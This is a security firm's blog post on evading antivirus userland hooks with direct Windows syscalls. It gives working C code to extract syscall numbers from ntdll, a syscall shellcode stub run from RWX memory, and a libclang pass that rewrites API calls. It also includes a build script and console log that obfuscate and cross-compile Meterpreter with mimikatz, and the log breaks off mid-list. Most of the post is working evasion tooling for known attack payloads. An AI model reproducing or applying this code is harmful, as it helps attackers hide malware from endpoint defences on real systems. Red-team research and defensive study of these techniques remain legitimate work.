# https://blog.scrt.ch/2022/04/19/3432/

­

Engineering antivirus evasion (Part III) – SCRT Team Blog

[Skip to content](https://blog.scrt.ch/2022/04/19/3432/#content)

Previous blog posts addressed the issue of static artefacts that can easily be caught by security software, such as strings and API imports:

- [https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/](https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/)
- [https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/](https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/)

This one provides an additional layer of obfuscation to target another kind of detection mechanism used to monitor a program’s activity, i.e userland hooks.

As usual, source code was published at

[https://github.com/scrt/avcleaner](https://github.com/scrt/avcleaner)

It comes with two additional niceties:

- A multithreaded Python script to obfuscate the entire Meterpreter codebase.
- A self-contained, position independent C source code to dynamically fetch syscalls numbers on Windows.

## A note on the State-of-the-Art of userland hooks evasion

<storytime>Our research on the subject started in 2017 as part of two externalised school semester projects. Some years before that, there already were some noise about some new antivirus able to detect “any threat” pre-execution, using “IA” and even apparently without the need of regular updates. Two fellow students at the time, having similar research projects, could not circumvent it. At around the same time, a friend working in an IT company invited me to a private demo of the software, where the salesman confidently asked me to throw things at it, and indeed I could not go past it 🙂

It is in 2017 that I encountered the software as part of a thesis, and this time I decided to stop jerking around and I reverse-engineered two thirds of the damn antivirus. This taught me about userland hooking, which I initially thought that no company in their right mind would ever do, but hey, who am I to judge.

About 6 months later I gave SCRT a full bypass of this software’s capabilities, alongside two self-protection bypasses to disable the antivirus in case it would ever be needed.</storytime>

In the meantime, many articles and tools were published on the subject and some work quite well. In any case, ours is only a bit different since we use a C/C++ source code obfuscator. And, because the public research on the subject is advanced enough, we don’t see any issue anymore by sharing it. Like all techniques, it comes with its pros and cons.

### Pros and cons

The advantages are:

- No hardcoded syscalls numbers
- No check against Windows’ version
- Generic accross AV/EDR.
- Able to, for instance, refactor a `CreateRemoteThread` call into a `NtCreateThreadEx` one, which does not have the same number or even order of parameters.
- Integrates well with other obfuscation passes, since all of it is made by the same software, with the same technologies.
- Thread-safe.

The downside are as follows:

- Need to have the Windows headers somewhere on disk :p
- Some disadvantages are specific to the way we get syscall numbers, but that actual implementation can be swapped easily for another one. These disadvantages are:
  - Read `ntdll.dll` from disk.
  - Need to get the type definition from MSDN in case you want to add support for another syscall.

Reading `ntdll.dll` from disk is seen as suboptimal in recent publications, with the arguments that it can “easily” be detected by antivirus since `ntdll.dll` is loaded into every process already and there is no “legit” need to do it again.

However, we’ve used this tool for 4 years now (at the time of writing) without any issue. Having ideas about what antivirus or blue teams should do is one thing, actually implementing it without false positives is quite another. Would that even be the case, we would attempt to bypass the `ntdll.dll` read detection, since NTFS is the PHP of fileystems.

As for the type definitions, it has been automated in other tools so their implementation could probably be integrated ( [https://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html](https://www.fireeye.com/blog/threat-research/2014/09/flare-ida-pro-script-series-msdn-annotations-ida-pro-for-malware-analysis.html)).

### Other tools

Other than that, here are some other popular tools that also fight userland hooks:

- [SysWhisper2](https://github.com/jthuraisamy/SysWhispers2)
- [FreshyCalls](https://github.com/crummie5/FreshyCalls)

### Evading userland hooks with raw syscalls

There are many techniques to go around userland hooks and we won’t provide yet another summary of each of these. Our approach, like many others, work by invoking syscalls. To do that, one needs the syscall number, which is specific to each version of Windows as opposed to syscalls on Unix.

There are many techniques to recover these syscall numbers:

- Hardcode them.
- Parse them from `ntdll.dll`.
- Bruteforce: since `ntoskrnl.exe` checks syscalls arguments and returns the error “ _INVALID\_PARAMETERS_“, one can leverage that as an Oracle and iterate over the syscall number until arguments are valid.
- Somehow get them from the hooked `ntdll.dll` in the process address space, which implies to detect and resolve hooks, which requires a disassembler which in turn increases our footprint.
- Sort the `ntdll.dll`’s EAT by name like shown in [https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/).

The last one is probably the simplest. In any case, here is the implementation details behind the technique used in _avcleaner_, which you can easily swap for the one you prefer.

## Get syscall numbers

The code shown in the subsequent section is written in such a way because it’s meant to be position independent.

### Get `ntdll.dll`’s export directory

Once the file is loaded into memory, one must locate the implementation of the API of interest. For instance, one can expect to find `NtCreateThreadEx` somewhere in the `.text` section, but its address is not predictible because of ASLR. However, `ntdll` being a library, it actually exposes this API and many others, so that software can reuse them. The collection of exposed API is stored inside the `Export directory` in a PE file. Each API is identified either by its name or an identifier called “Ordinal”. To reduce the footprint, it is arguably better to locate the API by ordinal. On the other hand, they are not guaranteed to stay the same accross Windows versions. Either way, here is how one would locate the export directory of a DLL:

```

static PIMAGE_EXPORT_DIRECTORY get_export_dir(LPBYTE file_buffer, DWORD file_size, PIMAGE_SECTION_HEADER *first_section, DWORD* nb_sections) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_buffer;

    // sanitity check
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        return;
    }

    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(file_buffer + dos_header->e_lfanew);
    *nb_sections = nt_header->FileHeader.NumberOfSections;

    *first_section = (PIMAGE_SECTION_HEADER) (file_buffer + dos_header->e_lfanew +sizeof(IMAGE_NT_HEADERS));

    DWORD export_rva = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

    // The field VirtualAddress needs a quick conversion in case the target is accessed in the file directly
    DWORD export_file_offset = rva_to_file_offset(*first_section, *nb_sections, file_size, export_rva);

    return (PIMAGE_EXPORT_DIRECTORY)(file_buffer + export_file_offset);
}
```

### Iterate over syscalls

Once the export table is locate, one can iterate over each entry. To actually get the API names in spite of the awkward indirections inherent to the PE file format, one could do as follows:

```

PIMAGE_SECTION_HEADER first_section; // first section's header, points to an array of sections headers.
    DWORD nb_sections = 0; // number of sections in ntdll

    PIMAGE_EXPORT_DIRECTORY export_directory = get_export_dir(file_buffer, file_size, &first_section, &nb_sections);

    PDWORD functions_address = (PDWORD)(file_buffer + rva_to_file_offset(first_section, nb_sections, file_size, export_directory->AddressOfFunctions));
    PWORD ordinals_address = (PWORD)(file_buffer + rva_to_file_offset(first_section, nb_sections, file_size, export_directory->AddressOfNameOrdinals));
    PDWORD names_address = (PDWORD)(file_buffer + rva_to_file_offset(first_section, nb_sections, file_size, export_directory->AddressOfNames));

    SIZE_T nb_api_names = sizeof(__API_names) / sizeof(__API_names[0]);
    syscall_infos = (syscall_info*)malloc(nb_api_names * sizeof(syscall_info));

    for (DWORD i = 0; i < export_directory->NumberOfNames; ++i)
    {
        DWORD rva_api = functions_address[ordinals_address[i]];
        DWORD file_offset_name = rva_to_file_offset(first_section, nb_sections, file_size, names_address[i]);

        unsigned char* name = file_buffer + file_offset_name;

         // filter everything except Zw* API functions
        if (!(*name == 'Z' && *(name + 1) == 'w'))
            continue;
```

### Get the syscall ID

From there the sky is the limit, as they are many ways to collect the syscall ID. The example below, which obviously does not care about efficiency, only proceeds in case the syscall corresponds to an API we want to obfuscate. For instance, the syscall ID can be found in the API’s disassembly, as shown with WinDbg below:

```
windbg > u NtCreateFile
ntdll!NtCreateFile:
00007ffa`202458e0 4c8bd1          mov     r10,rcx
00007ffa`202458e3 b855000000      mov     eax,55h
00007ffa`202458e8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffa`202458f0 7503            jne     ntdll!NtCreateFile+0x15 (00007ffa`202458f5)
00007ffa`202458f2 0f05            syscall
00007ffa`202458f4 c3              ret
00007ffa`202458f5 cd2e            int     2Eh
00007ffa`202458f7 c3              ret
```

Here, the syscall number is `0x55` (`mov eax, 55h`). Since every syscall is implemented in the same manner, the offset to this assembly instruction is always the same for every API. The offset is thus the number of bytes between `NtCreateFile`’s prologue and the operand of `mov`: 4 bytes (as can be seen by counting the bytes in the second column above).

```
// get the syscall id
DWORD syscall_id = *(DWORD *)(procedure_address + SYSCALL_ID_OFFSET);

// compare with the APIs we're interested in
for (unsigned int i = 0; i < nb_api_names; i++) {
    if (strequal(__API_names[i], (const char*)name))    {
        syscall_infos[i].name = __API_names[i];
        syscall_infos[i].id = syscall_id;
        break;
    }
}
```

This is a simple proof-of-concept that does the job, but with lots of imperfection. For instance, notice the `strequal` call, which uses API names as strings. This is a challenge for position independent code but also for antivirus detection, since strings are easy to find in binaries. Moreover, Windows Defender actually flags that with a low-score signature called “ApiRetrieval”, but in case everything else in your payload is well designed, it won’t bother flagging the file as malicious. That’s the reason it’s more standard to use API hashes, but unless the API hashing algorithm is itself polymorphic, the same problem might arise. Besides, string encryption would definitely be a valid alternative. Either way, we won’t provide any of that, since the goal is to document techniques, not provide perfect tools ready to pwn systems.

Since disassembling other syscalls shows that every syscall follows the same implementation save for the syscall number, we can safely define the following template and update the syscall number once we have it:

```

unsigned int syscall_id = syscall->id;

unsigned char syscall_shellcode[] = {
    0x4c,0x8b,0xd1, // mov r10, rcx
    0xb8,0x18,0x00,0x00,0x00, //-> to be updated with the correct syscall number
    0x0f,0x05, //syscall instruction.
    0xc3
};

//convert to little endian (byte swap)
unsigned char lvalue = syscall_id & 255;
unsigned char hvalue = (syscall_id / 256) & 255;

// update the shellcode with the correct syscall id
syscall_shellcode[4] = lvalue;
syscall_shellcode[5] = hvalue;
```

From there, the shellcode can be invoked as usual:

```
void *qapcmem = VirtualAlloc(0, sizeof(syscall_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(qapcmem, syscall_shellcode, sizeof(syscall_shellcode));
```

The memory area is set to RXW to bypass Data Execution Prevention (DEP). Some say it’s a detection vector but we never actually triggered an AV by doing that. In any case, if that bothers you, don’t hesitate to insert a `VirtualProtect` call or locate a code cave with existing RWX permissions.

Another detection vector would be the `syscall_shellcode` variable, since it will hold `0x0f, 0x05`, which could be detected by some YARA rules looking for direct syscalls. Encryption is left as an exercise to the reader.

### Clang obfuscation pass

The previous blog posts went into (lengthy) details about implementing an obfuscation pass with libclang. I think it is no necessary to do so here since no new concept is introduced. However, here is how simple it is to define a rule to transform one API call to a syscall, even if they don’t share the same number of arguments:

```
auto ZwWriteVirtualMemoryTypeDef = "typedef NTSTATUS(__stdcall *_ZwWriteVirtualMemory)(\n"
 " HANDLE ProcessHandle,\n"
 " PVOID BaseAddress,\n"
 " PVOID Buffer,\n"
 " ULONG NumberOfBytesToWrite,\n"
 " PULONG NumberOfBytesWritten);\n\n";

auto Cons = std::make_unique<ApiCallConsumer*>(new ApiCallConsumer("WriteProcessMemory", ZwWriteVirtualMemoryTypeDef,
"ZwWriteVirtualMemory", true));

consumers.push_back(*Cons);
```

Of course, for that to be possible, the obfuscation rule must know about the arguments and how to handle them, and the lines below simply take care of it:

```
/*
 * 1. Rename API to random identifier
 * 2. Adapt parameters
 * 3. Handle If conditions since the return value is different
 */
void ApiMatchHandler::rewriteApiToSyscall(const clang::CallExpr *pExpr, clang::ASTContext *const pContext,
                                          std::string ApiName) {
    std::string Replacement, Prefix, Suffix = "";
    std::ostringstream params(std::ostringstream::out);
    SourceRange Range;

    if (ApiName == "WriteProcessMemory") {
        llvm::outs() << "[*] Found WriteProcessMemory\n";
        std::vector<std::string> FunctionArgs = GetArgs(pExpr);

        params << "("
               << FunctionArgs.at(0) << ", "
               << FunctionArgs.at(1) << ", (PVOID)("
               << FunctionArgs.at(2) << "), (ULONG)("
               << FunctionArgs.at(3) << "), (PULONG)("
               << FunctionArgs.at(4) << "))";
        Replacement = params.str();
        Range = clang::SourceRange(pExpr->getBeginLoc(), pExpr->getEndLoc());
    }
```

An interesting bug I encountered while obfuscating meterpreter was API calls within if-statements, because the API call’s return value is used as a condition for executing another code block. However, Windows being Windows, syscall don’t return the same value in case of error / success and we must actually check against the macro _ERROR\_SUCCESS_.

```
if (isInsideIfCondition(pExpr, pContext)) {
    llvm::outs() << "CompountStmt > IfStmt\n";

    Suffix = " == ERROR_SUCCESS";
}
```

## Example with Meterpreter

Accompanying this blog post’s release, there is a python script that bootstraps _avcleaner_ and makes it easy to obfuscate a whole codebase at once. Of course you could just `**/*.c | xargs avcleaner` away but it brings some useful features:

- Statistics: `avcleaner`’s output is quite lengthy and sometimes, when working on a huge codebase, critical failures could be overlooked.
- Multithreading / multiprocessing: depending on your Python implementation, you can switch between them with 1 line of code at the top of the script and get the most performance. This allows to cut down execution time from ~30 minutes to ~30 seconds in the case of Meterpreter.
- Some files are opted out of the obfuscation pass because they contain some weird code patterns that can’t be handled correctly by `avcleaner`, and since our research time is limited, we decided to conveniently skip these files.
- Moreover, the statistics printed out at the end of the obfuscation pass should be regarded as an estimation, since the total number of “ _CreateRemoteThread_” for instance is counted with pattern matching Python-side, which obviously makes mistakes by accounting for occurrences in comments or something like that.

### Script

Here is a script that automates patching Meterpreter and cross-compiles it. This is possible since MSF 6 with the introduction of makefiles and dockerfiles allowing cross-compilation from any OS to Windows x86/x64 architectures.

```

#!/usr/bin/bash

set +e

PATCH_DIR="/Users/vladimir/dev/metasploit-evasion/build"
TMP_DIR=$(mktemp -d)
echo "Building in $TMP_DIR"
cd $TMP_DIR

# download meterpreter' source code
git clone https://github.com/rapid7/metasploit-payloads
cd metasploit-payloads
git submodule update --init --recursive

# apply manual patches
cd c/meterpreter
# ...
# run avcleaner
python3 avcleaner/scripts/obfuscate_meterpreter.py -p "$TMP_DIR/c/meterpreter/source" --edit --api --strings
make docker-x64
```

```
$ bash patch_obfuscate_metasploit_payloads.sh
Building in /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu
Cloning into 'metasploit-payloads'...
remote: Enumerating objects: 32669, done.
remote: Counting objects: 100% (542/542), done.
remote: Compressing objects: 100% (271/271), done.
remote: Total 32669 (delta 232), reused 426 (delta 157), pack-reused 32127
Receiving objects: 100% (32669/32669), 59.09 MiB | 8.89 MiB/s, done.
Resolving deltas: 100% (17555/17555), done.
Submodule 'deps' (https://github.com/rapid7/meterpreter-deps) registered for path 'c/meterpreter/deps'
Submodule 'source/ReflectiveDLLInjection' (https://github.com/rapid7/ReflectiveDLLInjection.git) registered for path 'c/meterpreter/source/ReflectiveDLLInjection'
Submodule 'c/meterpreter/source/extensions/kiwi/mimikatz' (https://github.com/rapid7/mimikatz) registered for path 'c/meterpreter/source/extensions/kiwi/mimikatz'
Cloning into '/private/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/deps'...
Cloning into '/private/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/ReflectiveDLLInjection'...
Cloning into '/private/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz'...
Submodule path 'c/meterpreter/deps': checked out '0f78fe95010a32f2c762154a2423256aeea80b0f'
Submodule path 'c/meterpreter/source/ReflectiveDLLInjection': checked out '6bad4c49327ad3b7d9cce6e280d034b76dbec928'
Submodule path 'c/meterpreter/source/extensions/kiwi/mimikatz': checked out 'a98af74db2d515600242c87495289dfa20ebeb60'
python3 /Users/vladimir/dev/scrt/avcleaner/misc/obfuscate_meterpreter_macos.py --api --strings --edit  -p /var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source && make docker-metsrv-x64 ; say "Bouh"
INFO:root:Analyzing 535 files...
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/libloader.c -> Counter({'WriteProcessMemory': 4, 'NtCreateSection': 4, 'NtMapViewOfSection': 4})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/base_inject.c -> Counter({'WriteProcessMemory': 6, 'NtQueueApcThread': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/remote_thread.c -> Counter({'CreateRemoteThread': 3})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/metsrv/base_dispatch.c -> Counter({'WriteProcessMemory': 4})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_misc.c -> Counter({'NtResumeProcess': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_process.c -> Counter({'NtResumeProcess': 2, 'NtSuspendProcess': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_net.c -> Counter({'SamFreeMemory': 18, 'SamCloseHandle': 10, 'SamEnumerateDomainsInSamServer': 6, 'SamOpenDomain': 4, 'SamConnect': 3, 'SamLookupDomainInSamServer': 3, 'SamRidToSid': 2, 'SamGetAliasMembership': 2, 'SamOpenUser': 1, 'SamOpenGroup': 1, 'SamOpenAlias': 1, 'SamGetGroupsForUser': 1, 'SamGetMembersInGroup': 1, 'SamGetMembersInAlias': 1, 'SamEnumerateUsersInDomain': 1, 'SamEnumerateGroupsInDomain': 1, 'SamEnumerateAliasesInDomain': 1, 'SamLookupIdsInDomain': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_lsadump.c -> Counter({'SamFreeMemory': 10, 'SamCloseHandle': 6, 'SamEnumerateDomainsInSamServer': 2, 'SamConnect': 2, 'SamOpenDomain': 2, 'SamOpenUser': 2, 'SamSetInformationUser': 2, 'SamLookupNamesInDomain': 2, 'SamLookupDomainInSamServer': 1, 'SamQueryInformationUser': 1, 'SamiChangePasswordUser': 1, 'SamEnumerateUsersInDomain': 1, 'SamLookupIdsInDomain': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c -> Counter({'NtResumeProcess': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_memory.c -> Counter({'WriteProcessMemory': 1, 'ReadProcessMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_cabinet.c -> Counter({'GetTempFileNameA': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/kiwi/mimikatz/modules/kull_m_remotelib.c -> Counter({'CreateRemoteThread': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/priv/tokendup.c -> Counter({'WriteProcessMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/priv/passwd.c -> Counter({'ReadProcessMemory': 3, 'WriteProcessMemory': 2})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/in-mem-exe.c -> Counter({'WriteProcessMemory': 6, 'NtUnmapViewOfSection': 4, 'ReadProcessMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/memory.c -> Counter({'WriteProcessMemory': 1, 'ReadProcessMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/util.c -> Counter({'WriteProcessMemory': 1})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/sys/process/ps.c -> Counter({'ReadProcessMemory': 3})
/var/folders/l9/x995_3m52yd6mm3qv98k6d180000gn/T/tmp.PoqyGRTu/metasploit-payloads/c/meterpreter/source/ReflectiveDLLInjection/dll/src/ReflectiveDll.c: 100%|███████████████████████████████████████████████| 535/535 [00:02<00:00, 251.14it/s]
INFO:root:Found 243 files with strings.
INFO:root:Found 18 files with suspicious API calls.
['/extensions/priv/namedpipe.c', '/extensions/kiwi/mimikatz/modules/kull_m_rdm.c', '/metsrv/pivot_tree.c', '/extensions/stdapi/server/sys/session.c', '/metsrv/remote_thread.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kull_m_rpc.c', '/metsrv/server_pivot.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_packages.c', '/metsrv/metsrv.c', '/extensions/stdapi/server/net/resolve.c', '/extensions/stdapi/server/net/config/arp.c', '/extensions/kiwi/mimikatz/modules/kull_m_busylight.c', '/screenshot/bmp2jpeg.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_ts.c', '/extensions/kiwi/mimikatz/modules/kull_m_key.c', '/extensions/kiwi/mimikatz/modules/kull_m_crypto_sk.c', '/extensions/priv/elevate.c', '/extensions/incognito/user_management.c', '/extensions/kiwi/mimikatz/mimilib/kdns.c', '/extensions/kiwi/mimikatz/modules/kull_m_minidump.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_lsadump.c', '/extensions/incognito/incognito.c', '/metsrv/server_transport_winhttp.c', '/elevator/elevator.c', '/metsrv/libloader.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c', '/extensions/stdapi/server/net/net.c', '/extensions/winpmem/winpmem.cpp', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-credentialkeys.c', '/extensions/stdapi/server/sys/eventlog/eventlog.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_utils.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_keys.c', '/extensions/kiwi/mimikatz/mimilib/sekurlsadbg/kwindbg.c', '/extensions/kiwi/mimikatz/modules/kull_m_hid.c', '/extensions/stdapi/server/ui/ui.c', '/extensions/stdapi/server/sys/process/image.c', '/extensions/incognito/hash_stealer.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_kerberos.c', '/extensions/kiwi/mimikatz/modules/kull_m_sr98.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/kuhl_m_dpapi.c', '/extensions/kiwi/mimikatz/mimilib/kappfree.c', '/screenshot/screenshot.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-bkrp_c.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_creds.c', '/extensions/kiwi/mimikatz/modules/kull_m_pn532.c', '/extensions/unhook/refresh.c', '/extensions/stdapi/server/sys/process/thread.c', '/extensions/espia/screen.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_mimicom.c', '/extensions/kiwi/mimikatz/modules/kull_m_asn1.c', '/metsrv/base.c', '/metsrv/core.c', '/extensions/kiwi/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_pki.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_sid.c', '/extensions/kiwi/mimikatz/modules/kull_m_registry.c', '/extensions/kiwi/main.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_dpapi.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos_claims.c', '/extensions/kiwi/mimikatz/modules/kull_m_crypto_remote.c', '/extensions/priv/priv.c', '/extensions/priv/fs.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_service_remote.c', '/extensions/stdapi/server/ui/keyboard.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc.c', '/extensions/stdapi/server/sys/process/util.c', '/ReflectiveDLLInjection/dll/src/ReflectiveLoader.c', '/metsrv/server_transport_tcp.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_powershell.c', '/extensions/kiwi/mimikatz/modules/kull_m_xml.c', '/extensions/kiwi/mimikatz/modules/kull_m_service.c', '/extensions/kiwi/mimikatz/modules/kull_m_file.c', '/extensions/stdapi/server/webcam/audio.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_msv1_0.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_ssh.c', '/metsrv/metapi.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-rprn.c', '/extensions/extapi/extapi.c', '/metsrv/base_dispatch.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_kernel.c', '/metsrv/channel.c', '/extensions/kiwi/mimikatz/modules/kull_m_handle.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-claims.c', '/extensions/priv/namedpipe_rpcss.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_acr.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_rdm.c', '/metsrv/thread.c', '/extensions/kiwi/mimikatz/mimilib/utils.c', '/extensions/stdapi/server/sys/config/config.c', '/extensions/espia/espia.c', '/extensions/kiwi/mimikatz/mimilib/kssp.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_wlan.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_process.c', '/extensions/extapi/adsi.c', '/extensions/kiwi/mimikatz/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_rdg.c', '/extensions/stdapi/server/fs/search.c', '/extensions/stdapi/server/net/config/proxy_config.c', '/metsrv/server_pivot_named_pipe.c', '/extensions/kiwi/mimikatz/mimilove/mimilove.c', '/metsrv/server_transport_wininet.c', '/extensions/kiwi/mimikatz/modules/kull_m_cred.c', '/extensions/kiwi/mimikatz/modules/kull_m_acr.c', '/extensions/winpmem/winpmem_meterpreter.cpp', '/extensions/stdapi/server/ui/desktop.c', '/extensions/extapi/clipboard.c', '/extensions/kiwi/mimikatz/mimilib/ksub.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c', '/extensions/kiwi/mimikatz/modules/kull_m_kernel.c', '/extensions/kiwi/mimikatz/modules/kull_m_cabinet.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa.c', '/extensions/unhook/unhook.c', '/extensions/lanattacks/dhcpserv.cpp', '/extensions/kiwi/mimikatz/mimikatz/modules/kerberos/kuhl_m_kerberos.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_sysenvvalue.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_sk.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_service.c', '/extensions/kiwi/mimikatz/modules/kull_m_output.c', '/extensions/kiwi/mimikatz/mimikatz/mimikatz.c', '/extensions/sniffer/sniffer.c', '/extensions/stdapi/server/ui/idle.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_lsadump_remote.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c', '/extensions/extapi/ntds_decrypt.c', '/extensions/extapi/wmi_interface.cpp', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_net.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_dpapi-entries.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-nrpc_c.c', '/extensions/kiwi/mimikatz/mimikatz/modules/kuhl_m_busylight.c', '/metsrv/unicode.c', '/extensions/kiwi/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c', '/extensions/peinjector/peinjector.c', '/extensions/kiwi/mimikatz/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt5.c', '/extensions/kiwi/mimikatz/modules/kull_m_remotelib.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_drsr.c', '/extensions/powershell/powershell_bindings.cpp', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_bkrp.c', '/extensions/extapi/clipboard_image.cpp', '/extensions/stdapi/server/net/socket/tcp.c', '/extensions/stdapi/server/webcam/bmp2jpeg.c', '/ReflectiveDLLInjection/inject/src/GetProcAddressR.c', '/extensions/stdapi/server/stdapi.c', '/extensions/kiwi/mimikatz/modules/kull_m_patch.c', '/metsrv/server_setup.c', '/extensions/kiwi/mimikatz/modules/rpc/kull_m_rpc_ms-drsr_c.c', 